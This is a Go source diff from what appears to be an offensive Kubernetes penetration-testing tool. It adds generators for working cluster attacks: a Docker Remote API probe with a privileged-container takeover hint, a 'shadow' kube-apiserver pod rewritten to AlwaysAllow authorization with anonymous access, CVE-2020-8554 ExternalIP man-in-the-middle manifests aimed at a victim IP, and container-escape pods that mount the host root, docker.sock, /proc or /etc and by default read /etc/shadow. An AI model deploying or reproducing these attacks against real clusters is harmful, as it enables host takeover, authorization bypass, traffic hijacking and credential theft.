@@ -6,13 +6,16 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"sort"
 	"strings"
 	"time"
 
 	"github.com/gin-gonic/gin"
 	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
 	"github.com/trymonoly/K8sPenTool-ng/internal/util"
+	corev1 "k8s.io/api/core/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
+	"sigs.k8s.io/yaml"
 )
 
 type CDKHandler struct{}
@@ -149,6 +152,11 @@ type dockerAPIRequest struct {
 	TimeoutSec int    `json:"timeout_sec"`
 }
 
+type dockerProbeTarget struct {
+	Port   int
+	Scheme string
+}
+
 func (h *CDKHandler) CheckDockerAPI(c *gin.Context) {
 	var req dockerAPIRequest
 	if err := c.ShouldBindJSON(&req); err != nil {
@@ -160,8 +168,8 @@ func (h *CDKHandler) CheckDockerAPI(c *gin.Context) {
 	}
 
 	// Docker Remote API typically on port 2375 (unencrypted) or 2376 (TLS)
-	for _, port := range []int{2375, 2376} {
-		url := fmt.Sprintf("http://%s:%d/info", req.TargetHost, port)
+	for _, target := range dockerProbeTargets() {
+		url := fmt.Sprintf("%s://%s:%d/info", target.Scheme, req.TargetHost, target.Port)
 		httpClient := util.BuildHTTPClient(true, req.TimeoutSec)
 		resp, err := httpClient.Get(url)
 		if err != nil {
@@ -171,14 +179,14 @@ func (h *CDKHandler) CheckDockerAPI(c *gin.Context) {
 		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
 		if resp.StatusCode == 200 && strings.Contains(string(body), "Containers") {
 			// Docker API is accessible! Try to list containers
-			containersURL := fmt.Sprintf("http://%s:%d/containers/json?all=true", req.TargetHost, port)
+			containersURL := fmt.Sprintf("%s://%s:%d/containers/json?all=true", target.Scheme, req.TargetHost, target.Port)
 			containersResp, err := httpClient.Get(containersURL)
 			containerInfo := []gin.H{}
 			if err == nil {
 				defer containersResp.Body.Close()
 				containersBody, readErr := io.ReadAll(io.LimitReader(containersResp.Body, 32768))
 				if readErr != nil {
-					c.JSON(http.StatusOK, gin.H{"accessible": true, "port": port, "error": "failed to read containers: " + readErr.Error()})
+					c.JSON(http.StatusOK, gin.H{"accessible": true, "port": target.Port, "scheme": target.Scheme, "error": "failed to read containers: " + readErr.Error()})
 					return
 				}
 				var containers []map[string]interface{}
@@ -201,16 +209,26 @@ func (h *CDKHandler) CheckDockerAPI(c *gin.Context) {
 				}
 			}
 			c.JSON(http.StatusOK, gin.H{
-				"accessible":    true,
-				"port":         port,
+				"accessible":   true,
+				"port":         target.Port,
+				"scheme":       target.Scheme,
 				"docker_info":  string(body),
 				"containers":   containerInfo,
-				"exploit_hint": fmt.Sprintf("Docker API accessible on port %d! Use 'cdk run docker-api-pwn' pattern: create a privileged container with host root mounted to /host", port),
+				"exploit_hint": fmt.Sprintf("Docker API accessible via %s on port %d! Use 'cdk run docker-api-pwn' pattern: create a privileged container with host root mounted to /host", strings.ToUpper(target.Scheme), target.Port),
 			})
 			return
 		}
 	}
 	c.JSON(http.StatusOK, gin.H{"accessible": false, "hint": "Docker Remote API not exposed on 2375/2376"})
+}
+
+func dockerProbeTargets() []dockerProbeTarget {
+	return []dockerProbeTarget{
+		{Port: 2375, Scheme: "http"},
+		{Port: 2376, Scheme: "https"},
+		{Port: 2376, Scheme: "http"},
+		{Port: 2375, Scheme: "https"},
+	}
 }
 
 // ==================== Shadow API Server ====================
@@ -244,9 +262,15 @@ func (h *CDKHandler) ShadowAPIServer(c *gin.Context) {
 	}
 
 	apiserverPods := make([]gin.H, 0)
+	recommendation := gin.H{}
+	shadowYAML := ""
+	warnings := []string{}
 	for _, pod := range podList.Items {
 		// Extract key info from apiserver pod
 		containers := make([]gin.H, 0)
+		var selectedContainer *corev1.Container
+		var selectedAuthMode string
+		var selectedSecurePort string
 		for _, cnt := range pod.Spec.Containers {
 			args := make([]string, 0)
 			authMode := ""
@@ -264,12 +288,18 @@ func (h *CDKHandler) ShadowAPIServer(c *gin.Context) {
 				}
 			}
 			containers = append(containers, gin.H{
-				"name":          cnt.Name,
-				"image":         cnt.Image,
-				"auth_mode":     authMode,
-				"secure_port":   securePort,
-				"args_preview":  args,
+				"name":         cnt.Name,
+				"image":        cnt.Image,
+				"auth_mode":    authMode,
+				"secure_port":  securePort,
+				"args_preview": args,
 			})
+			if selectedContainer == nil || isPreferredAPIServerContainer(cnt) {
+				cntCopy := cnt
+				selectedContainer = &cntCopy
+				selectedAuthMode = authMode
+				selectedSecurePort = securePort
+			}
 		}
 
 		apiserverPods = append(apiserverPods, gin.H{
@@ -278,54 +308,147 @@ func (h *CDKHandler) ShadowAPIServer(c *gin.Context) {
 			"node":       pod.Spec.NodeName,
 			"containers": containers,
 		})
-	}
 
-	// Generate shadow apiserver YAML hint
-	shadowYAML := `# Shadow API Server - deploys a modified kube-apiserver with:
-# --authorization-mode=AlwaysAllow
-# --anonymous-auth=true
-#
-# WARNING: This requires CREATE pod permission in kube-system
-# Connect to shadow apiserver at https://NODE_IP:9444
-apiVersion: v1
-kind: Pod
-metadata:
-  name: shadow-apiserver
-  namespace: kube-system
-  labels:
-    component: kube-apiserver
-    tier: control-plane
-spec:
-  hostNetwork: true
-  containers:
-  - name: kube-apiserver
-    image: IMAGE_FROM_CLUSTER
-    command:
-    - kube-apiserver
-    - --authorization-mode=AlwaysAllow
-    - --anonymous-auth=true
-    - --secure-port=9444
-    - --etcd-servers=ETCD_ENDPOINT
-    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
-    - --client-ca-file=/etc/kubernetes/pki/ca.crt
-    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
-    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
-    volumeMounts:
-    - name: etc-kubernetes
-      mountPath: /etc/kubernetes
-      readOnly: true
-  volumes:
-  - name: etc-kubernetes
-    hostPath:
-      path: /etc/kubernetes
-      type: DirectoryOrCreate`
+		if shadowYAML == "" && selectedContainer != nil {
+			shadowPod, shadowWarn := buildShadowAPIServerPod(pod, *selectedContainer)
+			body, marshalErr := yaml.Marshal(shadowPod)
+			if marshalErr == nil {
+				shadowYAML = string(body)
+			} else {
+				warnings = append(warnings, "failed to marshal shadow pod yaml: "+marshalErr.Error())
+			}
+			warnings = append(warnings, shadowWarn...)
+			recommendation = gin.H{
+				"source_pod":           pod.Name,
+				"source_node":          pod.Spec.NodeName,
+				"container_name":       selectedContainer.Name,
+				"image":                selectedContainer.Image,
+				"original_auth_mode":   selectedAuthMode,
+				"original_secure_port": selectedSecurePort,
+				"shadow_secure_port":   "9444",
+			}
+		}
+	}
 
 	c.JSON(http.StatusOK, gin.H{
 		"apiserver_pods": apiserverPods,
-		"total":         len(apiserverPods),
-		"shadow_yaml":   shadowYAML,
-		"hint":          "To create shadow apiserver: 1. Copy image and etcd args from existing apiserver 2. Replace --authorization-mode with AlwaysAllow 3. Change --secure-port to 9444 4. Deploy as new pod in kube-system",
+		"total":          len(apiserverPods),
+		"shadow_yaml":    shadowYAML,
+		"recommendation": recommendation,
+		"warnings":       warnings,
+		"hint":           "Generated from the first detected kube-apiserver pod. Review nodeName, etcd connectivity, and port 9444 exposure before applying.",
 	})
+}
+
+func isPreferredAPIServerContainer(cnt corev1.Container) bool {
+	if cnt.Name == "kube-apiserver" || strings.Contains(cnt.Name, "apiserver") {
+		return true
+	}
+	if strings.Contains(cnt.Image, "kube-apiserver") {
+		return true
+	}
+	for _, arg := range cnt.Args {
+		if strings.Contains(arg, "etcd-servers") || strings.Contains(arg, "authorization-mode") {
+			return true
+		}
+	}
+	return false
+}
+
+func buildShadowAPIServerPod(sourcePod corev1.Pod, sourceContainer corev1.Container) (*corev1.Pod, []string) {
+	warnings := []string{}
+	args, changed := rewriteShadowAPIServerArgs(sourceContainer.Args)
+	if !changed {
+		warnings = append(warnings, "source args did not contain standard auth/port flags; shadow pod uses appended overrides")
+	}
+	if !containsArgWithPrefix(args, "--etcd-servers=") {
+		warnings = append(warnings, "could not detect --etcd-servers from source pod")
+	}
+
+	volumeNames := map[string]struct{}{}
+	mounts := make([]corev1.VolumeMount, len(sourceContainer.VolumeMounts))
+	copy(mounts, sourceContainer.VolumeMounts)
+	for _, mount := range mounts {
+		volumeNames[mount.Name] = struct{}{}
+	}
+	volumes := make([]corev1.Volume, 0, len(volumeNames))
+	for _, volume := range sourcePod.Spec.Volumes {
+		if _, ok := volumeNames[volume.Name]; ok {
+			volumes = append(volumes, volume)
+		}
+	}
+	sort.Slice(volumes, func(i, j int) bool { return volumes[i].Name < volumes[j].Name })
+
+	shadowPod := &corev1.Pod{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "shadow-apiserver",
+			Namespace: sourcePod.Namespace,
+			Labels: map[string]string{
+				"component": sourcePod.Labels["component"],
+				"tier":      sourcePod.Labels["tier"],
+				"shadow":    "true",
+			},
+		},
+		Spec: corev1.PodSpec{
+			HostNetwork:        true,
+			NodeName:           sourcePod.Spec.NodeName,
+			ServiceAccountName: sourcePod.Spec.ServiceAccountName,
+			PriorityClassName:  sourcePod.Spec.PriorityClassName,
+			Tolerations:        append([]corev1.Toleration(nil), sourcePod.Spec.Tolerations...),
+			Volumes:            volumes,
+			Containers: []corev1.Container{{
+				Name:            "kube-apiserver",
+				Image:           sourceContainer.Image,
+				ImagePullPolicy: sourceContainer.ImagePullPolicy,
+				Command:         append([]string(nil), sourceContainer.Command...),
+				Args:            args,
+				VolumeMounts:    mounts,
+			}},
+		},
+	}
+	if shadowPod.Spec.HostNetwork {
+		shadowPod.Spec.DNSPolicy = corev1.DNSClusterFirstWithHostNet
+	}
+	return shadowPod, warnings
+}
+
+func rewriteShadowAPIServerArgs(sourceArgs []string) ([]string, bool) {
+	args := make([]string, 0, len(sourceArgs)+3)
+	changed := false
+	for _, arg := range sourceArgs {
+		switch {
+		case strings.HasPrefix(arg, "--authorization-mode="):
+			args = append(args, "--authorization-mode=AlwaysAllow")
+			changed = true
+		case strings.HasPrefix(arg, "--anonymous-auth="):
+			args = append(args, "--anonymous-auth=true")
+			changed = true
+		case strings.HasPrefix(arg, "--secure-port="):
+			args = append(args, "--secure-port=9444")
+			changed = true
+		default:
+			args = append(args, arg)
+		}
+	}
+	if !containsArgWithPrefix(args, "--authorization-mode=") {
+		args = append(args, "--authorization-mode=AlwaysAllow")
+	}
+	if !containsArgWithPrefix(args, "--anonymous-auth=") {
+		args = append(args, "--anonymous-auth=true")
+	}
+	if !containsArgWithPrefix(args, "--secure-port=") {
+		args = append(args, "--secure-port=9444")
+	}
+	return args, changed
+}
+
+func containsArgWithPrefix(args []string, prefix string) bool {
+	for _, arg := range args {
+		if strings.HasPrefix(arg, prefix) {
+			return true
+		}
+	}
+	return false
 }
 
 // ==================== ClusterIP MITM (CVE-2020-8554) ====================
@@ -337,7 +460,8 @@ type mitmRequest struct {
 	Token      string `json:"token"`
 	SkipTLS    bool   `json:"skip_tls"`
 	TimeoutSec int    `json:"timeout_sec"`
-	TargetIP   string `json:"target_ip"`
+	TargetIP   string `json:"target_ip"` // legacy alias
+	VictimIP   string `json:"victim_ip"`
 	TargetPort int    `json:"target_port"`
 }
 
@@ -347,17 +471,42 @@ func (h *CDKHandler) ClusterIPMITM(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	if req.TargetIP == "" {
-		req.TargetIP = "1.1.1.1" // default target for demo
-	}
+	victimIP := resolveMITMVictimIP(req)
 	if req.TargetPort == 0 {
 		req.TargetPort = 443
 	}
 
 	// Generate CVE-2020-8554 exploit YAML
-	mitmYAML := fmt.Sprintf(`# CVE-2020-8554: Man-in-the-Middle via ExternalIP
-# Creates a LoadBalancer/NodePort Service with a malicious ExternalIP
-# that hijacks traffic to %s:%d
+	mitmYAML := buildClusterIPMITMYAML(victimIP, req.TargetPort)
+
+	c.JSON(http.StatusOK, gin.H{
+		"yaml":       mitmYAML,
+		"cve":        "CVE-2020-8554",
+		"victim_ip":  victimIP,
+		"claimed_ip": victimIP,
+		"description": fmt.Sprintf(
+			"Creates a Service that claims ExternalIP=%s. If the cluster is vulnerable, "+
+				"traffic from nodes/pods to %s:%d can be redirected to the attacker's backend pods selected by this Service. "+
+				"Use Apply to deploy this YAML.", victimIP, victimIP, req.TargetPort),
+		"note":         "这里的 ExternalIP 应填写你想劫持的受害目标 IP，而不是攻击者节点 IP。",
+		"mitigated_by": "K8s 1.18+ with DenyServiceExternalIPs admission controller",
+	})
+}
+
+func resolveMITMVictimIP(req mitmRequest) string {
+	if req.VictimIP != "" {
+		return req.VictimIP
+	}
+	if req.TargetIP != "" {
+		return req.TargetIP
+	}
+	return "1.1.1.1"
+}
+
+func buildClusterIPMITMYAML(victimIP string, targetPort int) string {
+	return fmt.Sprintf(`# CVE-2020-8554: Man-in-the-Middle via ExternalIP
+# Claims the victim ExternalIP so traffic destined for %s:%d is redirected
+# to attacker-controlled backend pods selected by this Service.
 ---
 apiVersion: v1
 kind: Service
@@ -395,17 +544,7 @@ spec:
         image: nicolaka/netshoot:latest
         command: ["/bin/sh"]
         args: ["-c", "tcpdump -i any -nn port %d; while true; do sleep 3600; done"]`,
-		req.TargetIP, req.TargetPort, req.TargetIP, req.TargetPort, req.TargetPort, req.TargetPort)
-
-	c.JSON(http.StatusOK, gin.H{
-		"yaml": mitmYAML,
-		"cve":  "CVE-2020-8554",
-		"description": fmt.Sprintf(
-			"Creates a Service with ExternalIP=%s. If the cluster is vulnerable, "+
-				"traffic from nodes/pods to %s:%d will be hijacked to the attacker's deployment. "+
-				"Use Apply to deploy this YAML.", req.TargetIP, req.TargetIP, req.TargetPort),
-		"mitigated_by": "K8s 1.18+ with DenyServiceExternalIPs admission controller",
-	})
+		victimIP, targetPort, victimIP, targetPort, targetPort, targetPort)
 }
 
 // ==================== Unified Escape Pod ====================
@@ -429,126 +568,29 @@ func (h *CDKHandler) GenerateEscapePod(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	if req.EscapeMode == "" {
-		req.EscapeMode = "privileged"
-	}
+	req.EscapeMode = normalizeEscapeMode(req.EscapeMode)
 	if req.Namespace == "" {
 		req.Namespace = "default"
 	}
 	if req.Command == "" {
-		req.Command = "id; cat /host/etc/shadow 2>/dev/null || echo 'No /host mount'"
+		req.Command = defaultEscapeCommand(req.EscapeMode)
 	}
 
-	podName := fmt.Sprintf("cdk-escape-%s", req.EscapeMode)
-	nodeSelector := ""
-	if req.NodeName != "" {
-		nodeSelector = fmt.Sprintf("  nodeName: %s\n", req.NodeName)
+	pod := buildEscapePodObject(req)
+	body, err := yaml.Marshal(pod)
+	if err != nil {
+		c.JSON(http.StatusOK, gin.H{"error": "marshal escape pod yaml: " + err.Error()})
+		return
 	}
-
-	// Build pod spec based on escape mode
-	var extraVolumes, extraMounts, extraSpec string
-
-	switch req.EscapeMode {
-	case "privileged":
-		// Full privileged: mount host root, use host namespaces
-		extraSpec = `  hostPID: true
-  hostNetwork: true
-  hostIPC: true`
-		extraVolumes = `  - name: host-root
-    hostPath:
-      path: /
-  - name: docker-sock
-    hostPath:
-      path: /var/run/docker.sock
-      type: Socket`
-		extraMounts = `    - name: host-root
-      mountPath: /host
-    - name: docker-sock
-      mountPath: /var/run/docker.sock`
-
-	case "docker-sock":
-		// Only need docker.sock mount
-		extraVolumes = `  - name: docker-sock
-    hostPath:
-      path: /var/run/docker.sock
-      type: Socket`
-		extraMounts = `    - name: docker-sock
-      mountPath: /var/run/docker.sock`
-
-	case "host-proc":
-		// Mount host /proc for core_pattern exploit
-		extraVolumes = `  - name: host-proc
-    hostPath:
-      path: /proc`
-		extraMounts = `    - name: host-proc
-      mountPath: /host/proc`
-
-	case "cap-dac":
-		// CAP_DAC_READ_SEARCH + host file bind mount
-		extraVolumes = `  - name: host-etc
-    hostPath:
-      path: /etc`
-		extraMounts = `    - name: host-etc
-      mountPath: /host/etc`
-
-	case "kubelet-log":
-		// /var/log mount for kubelet log escape
-		extraVolumes = `  - name: var-log
-    hostPath:
-      path: /var/log`
-		extraMounts = `    - name: var-log
-      mountPath: /var/log
-      readOnly: false`
-
-	default:
-		extraVolumes = `  - name: host-root
-    hostPath:
-      path: /`
-		extraMounts = `    - name: host-root
-      mountPath: /host`
-	}
-
-	privileged := ""
-	if req.EscapeMode == "privileged" || req.EscapeMode == "cap-dac" {
-		privileged = `  containers:
-  - name: escape
-    image: alpine:3.20
-    command: ["/bin/sh"]
-    args: ["-c", "sleep 3600"]
-    securityContext:
-      privileged: true`
-	} else {
-		privileged = `  containers:
-  - name: escape
-    image: alpine:3.20
-    command: ["/bin/sh"]
-    args: ["-c", "sleep 3600"]
-    securityContext:
-      privileged: false`
-	}
-
-	yaml := fmt.Sprintf(`apiVersion: v1
-kind: Pod
-metadata:
-  name: %s
-  namespace: %s
-  labels:
-    app: cdk-escape
-    cdk-mode: %s
-spec:
-%s
-%s%s
-%s%s
-  restartPolicy: Never`,
-		podName, req.Namespace, req.EscapeMode, nodeSelector, extraSpec,
-		privileged, extraVolumes, extraMounts)
+	yaml := string(body)
+	podName := pod.Name
 
 	// Generate post-deploy exploit commands
 	exploitCommands := h.getExploitCommands(req.EscapeMode)
 
 	c.JSON(http.StatusOK, gin.H{
-		"yaml":              yaml,
-		"escape_mode":       req.EscapeMode,
+		"yaml":             yaml,
+		"escape_mode":      req.EscapeMode,
 		"namespace":        req.Namespace,
 		"pod_name":         podName,
 		"exploit_commands": exploitCommands,
@@ -560,6 +602,146 @@ spec:
 			"step4": "Run exploit commands shown below",
 		},
 	})
+}
+
+func normalizeEscapeMode(mode string) string {
+	switch mode {
+	case "privileged", "docker-sock", "host-proc", "cap-dac", "kubelet-log":
+		return mode
+	default:
+		return "privileged"
+	}
+}
+
+func defaultEscapeCommand(mode string) string {
+	switch mode {
+	case "docker-sock":
+		return "id; ls -l /var/run/docker.sock; sleep 3600"
+	case "host-proc":
+		return "id; ls -la /host/proc/1/root 2>/dev/null || echo 'No host /proc access'; sleep 3600"
+	case "cap-dac":
+		return "id; cat /host/etc/shadow 2>/dev/null || echo 'Shadow not accessible'; sleep 3600"
+	case "kubelet-log":
+		return "id; ls -la /var/log; sleep 3600"
+	default:
+		return "id; ls -la /host 2>/dev/null; sleep 3600"
+	}
+}
+
+func buildEscapePodObject(req escapePodRequest) *corev1.Pod {
+	mode := normalizeEscapeMode(req.EscapeMode)
+	command := req.Command
+	if strings.TrimSpace(command) == "" {
+		command = defaultEscapeCommand(mode)
+	}
+
+	pod := &corev1.Pod{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      fmt.Sprintf("cdk-escape-%s", mode),
+			Namespace: req.Namespace,
+			Labels: map[string]string{
+				"app":      "cdk-escape",
+				"cdk-mode": mode,
+			},
+		},
+		Spec: corev1.PodSpec{
+			RestartPolicy: corev1.RestartPolicyNever,
+			Containers: []corev1.Container{{
+				Name:    "escape",
+				Image:   "alpine:3.20",
+				Command: []string{"/bin/sh"},
+				Args:    []string{"-c", command},
+			}},
+		},
+	}
+	if req.NodeName != "" {
+		pod.Spec.NodeName = req.NodeName
+	}
+
+	container := &pod.Spec.Containers[0]
+	switch mode {
+	case "privileged":
+		privileged := true
+		pod.Spec.HostPID = true
+		pod.Spec.HostNetwork = true
+		pod.Spec.HostIPC = true
+		container.SecurityContext = &corev1.SecurityContext{
+			Privileged: &privileged,
+		}
+		pod.Spec.Volumes = []corev1.Volume{
+			hostPathVolume("host-root", "/", corev1.HostPathDirectory),
+			hostPathVolume("docker-sock", "/var/run/docker.sock", corev1.HostPathSocket),
+		}
+		container.VolumeMounts = []corev1.VolumeMount{
+			{Name: "host-root", MountPath: "/host"},
+			{Name: "docker-sock", MountPath: "/var/run/docker.sock"},
+		}
+
+	case "docker-sock":
+		privileged := false
+		container.SecurityContext = &corev1.SecurityContext{
+			Privileged: &privileged,
+		}
+		pod.Spec.Volumes = []corev1.Volume{
+			hostPathVolume("docker-sock", "/var/run/docker.sock", corev1.HostPathSocket),
+		}
+		container.VolumeMounts = []corev1.VolumeMount{
+			{Name: "docker-sock", MountPath: "/var/run/docker.sock"},
+		}
+
+	case "host-proc":
+		privileged := false
+		container.SecurityContext = &corev1.SecurityContext{
+			Privileged: &privileged,
+		}
+		pod.Spec.Volumes = []corev1.Volume{
+			hostPathVolume("host-proc", "/proc", corev1.HostPathDirectory),
+		}
+		container.VolumeMounts = []corev1.VolumeMount{
+			{Name: "host-proc", MountPath: "/host/proc"},
+		}
+
+	case "cap-dac":
+		privileged := false
+		container.SecurityContext = &corev1.SecurityContext{
+			Privileged: &privileged,
+			Capabilities: &corev1.Capabilities{
+				Add: []corev1.Capability{"DAC_READ_SEARCH"},
+			},
+		}
+		pod.Spec.Volumes = []corev1.Volume{
+			hostPathVolume("host-etc", "/etc", corev1.HostPathDirectory),
+		}
+		container.VolumeMounts = []corev1.VolumeMount{
+			{Name: "host-etc", MountPath: "/host/etc"},
+		}
+
+	case "kubelet-log":
+		privileged := false
+		container.SecurityContext = &corev1.SecurityContext{
+			Privileged: &privileged,
+		}
+		pod.Spec.Volumes = []corev1.Volume{
+			hostPathVolume("var-log", "/var/log", corev1.HostPathDirectory),
+		}
+		container.VolumeMounts = []corev1.VolumeMount{
+			{Name: "var-log", MountPath: "/var/log", ReadOnly: false},
+		}
+	}
+
+	return pod
+}
+
+func hostPathVolume(name, path string, pathType corev1.HostPathType) corev1.Volume {
+	return corev1.Volume{
+		Name: name,
+		VolumeSource: corev1.VolumeSource{
+			HostPath: &corev1.HostPathVolumeSource{
+				Path: path,
+				Type: &pathType,
+			},
+		},
+	}
 }
 
 func (h *CDKHandler) getExploitCommands(mode string) []gin.H {
@@ -634,11 +816,11 @@ func (h *CDKHandler) getExploitCommands(mode string) []gin.H {
 
 func getEscapeDescription(mode string) string {
 	descriptions := map[string]string{
-		"privileged":   "经典特权容器逃逸：挂载宿主机根目录，利用 cgroup release_agent 或直接挂载磁盘获取宿主机权限",
-		"docker-sock":  "Docker Socket 逃逸：利用挂载的 docker.sock 创建特权容器，挂载宿主机文件系统",
-		"host-proc":    "core_pattern 逃逸：利用挂载的宿主机 /proc，覆写 core_pattern 实现命令执行",
-		"cap-dac":      "CAP_DAC_READ_SEARCH 逃逸：利用该 capability 绕过文件权限检查，读取宿主机敏感文件",
-		"kubelet-log":  "Kubelet /var/log 逃逸：利用 /var/log 挂载创建符号链接，通过 kubelet /logs/ 端点读取任意文件",
+		"privileged":  "经典特权容器逃逸：挂载宿主机根目录，利用 cgroup release_agent 或直接挂载磁盘获取宿主机权限",
+		"docker-sock": "Docker Socket 逃逸：利用挂载的 docker.sock 创建特权容器，挂载宿主机文件系统",
+		"host-proc":   "core_pattern 逃逸：利用挂载的宿主机 /proc，覆写 core_pattern 实现命令执行",
+		"cap-dac":     "CAP_DAC_READ_SEARCH 逃逸：利用该 capability 绕过文件权限检查，读取宿主机敏感文件",
+		"kubelet-log": "Kubelet /var/log 逃逸：利用 /var/log 挂载创建符号链接，通过 kubelet /logs/ 端点读取任意文件",
 	}
 	if d, ok := descriptions[mode]; ok {
 		return d
@@ -768,16 +950,16 @@ func (h *CDKHandler) AssessEscape(c *gin.Context) {
 	riskyCount := len(allResults)
 
 	c.JSON(http.StatusOK, gin.H{
-		"total_pods":   totalPods,
-		"risky_count":  riskyCount,
-		"high_risk":    highRisk,
-		"medium_risk":  mediumRisk,
-		"all_risks":    allResults,
+		"total_pods":  totalPods,
+		"risky_count": riskyCount,
+		"high_risk":   highRisk,
+		"medium_risk": mediumRisk,
+		"all_risks":   allResults,
 		"summary": gin.H{
-			"critical_privileged": countWhere(allResults, func(r escapeRiskItem) bool { return r.Privileged }),
-			"host_namespace":      countWhere(allResults, func(r escapeRiskItem) bool { return r.HostPID || r.HostNetwork || r.HostIPC }),
-			"host_mounts":         countWhere(allResults, func(r escapeRiskItem) bool { return len(r.HostMounts) > 0 }),
-			"docker_sock":         countWhere(allResults, func(r escapeRiskItem) bool { return r.DockerSock }),
+			"critical_privileged":   countWhere(allResults, func(r escapeRiskItem) bool { return r.Privileged }),
+			"host_namespace":        countWhere(allResults, func(r escapeRiskItem) bool { return r.HostPID || r.HostNetwork || r.HostIPC }),
+			"host_mounts":           countWhere(allResults, func(r escapeRiskItem) bool { return len(r.HostMounts) > 0 }),
+			"docker_sock":           countWhere(allResults, func(r escapeRiskItem) bool { return r.DockerSock }),
 			"privileged_containers": countWhere(allResults, func(r escapeRiskItem) bool { return r.Privileged }),
 		},
 	})
@@ -817,4 +999,3 @@ func countWhere(items []escapeRiskItem, pred func(escapeRiskItem) bool) int {
 	}
 	return n
 }
-
